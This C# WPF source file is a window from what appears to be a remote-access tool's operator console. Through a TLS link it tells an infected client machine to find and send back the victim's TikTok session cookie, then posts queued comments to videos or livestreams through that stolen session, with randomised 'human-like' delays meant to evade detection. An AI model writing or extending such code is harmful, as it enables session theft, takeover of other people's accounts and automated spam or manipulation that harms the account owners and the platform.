using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class TikTokWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool _maximized;
    private bool _running;
    private int  _sentCount;
    private CancellationTokenSource? _cts;

    public TikTokWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = $"  —  {label}";

        _server.RegisterHandler(clientId, PacketType.TikTokCommentAck,   OnAck);
        _server.RegisterHandler(clientId, PacketType.TikTokCookieResult, OnCookieResult);

        Closed += (_, _) =>
        {
            _cts?.Cancel();
            _server.UnregisterHandler(clientId, PacketType.TikTokCommentAck);
            _server.UnregisterHandler(clientId, PacketType.TikTokCookieResult);
        };

        RbLive.Checked  += (_, _) => TxtIdLabel.Text = "Livestream room ID or URL";
        RbVideo.Checked += (_, _) => TxtIdLabel.Text = "Video URL or ID";
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void OnAck(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<TikTokCommentAckData>(pkt.Data);
        if (d == null) return;
        Dispatcher.Invoke(() =>
        {
            if (d.Success)
            {
                _sentCount++;
                TxtSentCount.Text = $"  {_sentCount} sent";
                AddLog($"[✓] Posted successfully");
                TxtStatus.Text = $"{_sentCount} comment(s) sent";
            }
            else
            {
                AddLog($"[✗] {d.Error}");
                TxtStatus.Text = $"Failed — {d.Error[..Math.Min(d.Error.Length, 60)]}";
            }
        });
    }

    private void OnCookieResult(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<TikTokCookieResultData>(pkt.Data);
        if (d == null) return;
        Dispatcher.Invoke(() =>
        {
            if (d.Found)
            {
                TxtCookie.Text = d.Cookie;
                AddLog("[✓] Session found — cookie loaded");
                TxtStatus.Text = "Session detected and loaded";
            }
            else
            {
                AddLog("[✗] No TikTok session found — paste your cookie manually");
                TxtStatus.Text = "No session found on this machine";
            }
        });
    }

    // ── Queue runner ─────────────────────────────────────────────────────────

    private async void BtnStart_Click(object s, RoutedEventArgs e)
    {
        var comments = GetComments();
        if (comments.Length == 0) { TxtStatus.Text = "Enter at least one comment."; return; }
        if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = "Enter a video/room ID."; return; }
        if (!int.TryParse(TxtDelayMin.Text, out int dMin) || !int.TryParse(TxtDelayMax.Text, out int dMax))
        { TxtStatus.Text = "Invalid delay values."; return; }
        if (dMin > dMax) dMax = dMin;

        SetRunning(true);
        _cts = new CancellationTokenSource();
        var ct = _cts.Token;

        AddLog($"[▶] Starting queue — {comments.Length} comment(s), delay {dMin}-{dMax}s");

        await Task.Run(async () =>
        {
            int idx = 0;
            while (!ct.IsCancellationRequested)
            {
                string comment = comments[idx % comments.Length];
                idx++;

                Dispatcher.Invoke(() =>
                {
                    TxtBadge.Text = $"POSTING ({idx}/{comments.Length})";
                    TxtProgress.Text = $"{idx - 1}/{comments.Length}";
                });

                await SendComment(comment);

                // Wait for ACK with 10s timeout
                await Task.Delay(500, ct);

                // Human-like delay between posts
                int delay = Random.Shared.Next(dMin, dMax + 1) * 1000;
                Dispatcher.Invoke(() => TxtStatus.Text = $"Waiting {delay / 1000}s…");
                try { await Task.Delay(delay, ct); } catch (OperationCanceledException) { break; }

                // Stop after one full pass if not looping (only loop if user keeps clicking Start)
                if (idx >= comments.Length) break;
            }

            Dispatcher.Invoke(() => SetRunning(false));
        }, ct);

        if (!ct.IsCancellationRequested)
            SetRunning(false);
    }

    private void BtnStop_Click(object s, RoutedEventArgs e)
    {
        _cts?.Cancel();
        SetRunning(false);
        AddLog("[■] Stopped by user");
    }

    private async void BtnPostOnce_Click(object s, RoutedEventArgs e)
    {
        var comments = GetComments();
        if (comments.Length == 0) { TxtStatus.Text = "Enter a comment."; return; }
        if (string.IsNullOrEmpty(TxtVideoId.Text.Trim())) { TxtStatus.Text = "Enter a video/room ID."; return; }
        await SendComment(comments[0]);
        AddLog($"[→] Sending single: {comments[0][..Math.Min(comments[0].Length, 40)]}…");
        TxtStatus.Text = "Sending…";
    }

    private async void BtnDetect_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TikTokDetectCookie });
        TxtStatus.Text = "Detecting session…";
        AddLog("[?] Looking for TikTok session on machine…");
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private async Task SendComment(string text)
    {
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TikTokComment,
            Data = JsonConvert.SerializeObject(new TikTokCommentData
            {
                VideoId    = TxtVideoId.Text.Trim(),
                Text       = text,
                Cookie     = TxtCookie.Text.Trim(),
                IsLiveroom = RbLive.IsChecked == true
            })
        });
    }

    private string[] GetComments()
        => TxtComments.Text
            .Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(l => l.Trim())
            .Where(l => l.Length > 0)
            .ToArray();

    private void SetRunning(bool running)
    {
        _running = running;
        BtnStart.IsEnabled = !running; BtnStart.Opacity = running ? 0.4 : 1.0;
        BtnStop.IsEnabled  =  running; BtnStop.Opacity  = running ? 1.0 : 0.4;
        BadgeRunning.Visibility = running ? Visibility.Visible : Visibility.Collapsed;
        if (!running) { TxtBadge.Text = "RUNNING"; TxtProgress.Text = ""; }
    }

    private void TxtComments_Changed(object s, System.Windows.Controls.TextChangedEventArgs e)
    {
        var n = GetComments().Length;
        TxtQueueCount.Text = $"{n} comment{(n != 1 ? "s" : "")}";
    }

    private void RbTarget_Changed(object s, RoutedEventArgs e) { }

    private void AddLog(string msg)
    {
        TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
        TxtLog.ScrollToEnd();
    }

    private void BtnClearLog_Click(object s, RoutedEventArgs e)
    {
        TxtLog.Clear();
        _sentCount = 0;
        TxtSentCount.Text = "  0 sent";
    }

    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMax.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }
    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
